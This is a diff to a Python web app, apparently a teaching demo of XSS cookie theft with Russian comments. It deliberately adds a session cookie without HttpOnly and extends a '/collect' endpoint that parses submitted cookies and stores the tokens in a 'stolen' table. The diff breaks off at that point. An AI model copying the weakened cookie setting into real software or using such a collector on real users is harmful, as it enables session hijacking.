@@ -141,7 +141,10 @@ async def login(request: Request,
     conn.commit()
 
     resp = RedirectResponse("/dashboard", status_code=302)
+    # основной токен — защищён HttpOnly (JS не читает)
     resp.set_cookie("token", token, httponly=True, samesite="lax", max_age=3600)
+    # demo_token — без HttpOnly, уязвим к XSS (для демонстрации)
+    resp.set_cookie("demo_token", token, httponly=False, samesite="lax", max_age=3600)
     return resp
 
 @app.get("/dashboard", response_class=HTMLResponse)
@@ -214,12 +217,23 @@ async def collect(request: Request):
         return {"status": "error"}
 
     cookies_raw = data.get("cookies", "")
-    token = None
-    for part in cookies_raw.split(";"):
-        part = part.strip()
-        if part.startswith("token="):
-            token = part[6:]
-            break
+
+    # сначала берём явно переданный token (demo_token без HttpOnly)
+    token = data.get("token", None)
+
+    # если нет — пробуем достать из cookies строки
+    if not token:
+        for part in cookies_raw.split(";"):
+            part = part.strip()
+            if part.startswith("demo_token="):
+                token = part[11:]
+                break
+    if not token:
+        for part in cookies_raw.split(";"):
+            part = part.strip()
+            if part.startswith("token="):
+                token = part[6:]
+                break
 
     conn = get_conn()
     conn.execute("""CREATE TABLE IF NOT EXISTS stolen (
